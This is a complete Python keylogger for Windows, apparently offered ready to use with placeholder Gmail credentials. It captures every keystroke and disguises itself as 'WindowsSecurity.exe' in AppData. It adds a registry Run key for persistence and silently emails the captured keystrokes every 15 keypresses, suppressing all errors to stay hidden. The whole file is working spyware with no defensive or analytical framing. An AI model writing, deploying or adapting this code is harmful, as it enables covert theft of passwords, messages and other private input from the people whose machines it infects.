import pynput
import smtplib
import os
import shutil
import sys
import subprocess

class Keylogger:
    def __init__(self, email, password, key_limit=15):
        self.log = ""
        self.email = email
        self.password = password
        self.key_limit = key_limit
        self.pressed_keys = 0
        self.become_persistent()

    def become_persistent(self):
        """ Hides executable in 'AppData\Roaming\Microsoft' and sets it to run at startup """
        hidden_location = os.path.join(os.environ["APPDATA"], "Microsoft", "WindowsSecurity.exe")

        if not os.path.exists(hidden_location):
            try:
                shutil.copyfile(sys.executable, hidden_location)
                subprocess.call(
                    f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSecurity /t REG_SZ /d "{hidden_location}"',
                    shell=True
                )
            except:
                pass

    def process_key_press(self, key):
        """ Logs the keypress and sends email after 15 keypresses """
        try:
            self.log += str(key.char)
        except AttributeError:
            special_keys = {key.space: " ", key.enter: "[ENTER]", key.backspace: "[BACKSPACE]"}
            self.log += special_keys.get(key, f"[{str(key)}]")

        self.pressed_keys += 1

        if self.pressed_keys >= self.key_limit:
            self.send_mail(self.email, self.password, self.log)
            self.log = ""
            self.pressed_keys = 0

    def send_mail(self, email, password, message):
        """ Silently sends the keystroke logs via email """
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
        except:
            pass

    def start(self):
        """ Starts the keylogger """
        with pynput.keyboard.Listener(on_press=self.process_key_press) as listener:
            listener.join()

my_keylogger = Keylogger("youre-email@gmail.com", "your password or Google app key if 2fa is enabled") 
my_keylogger.start()

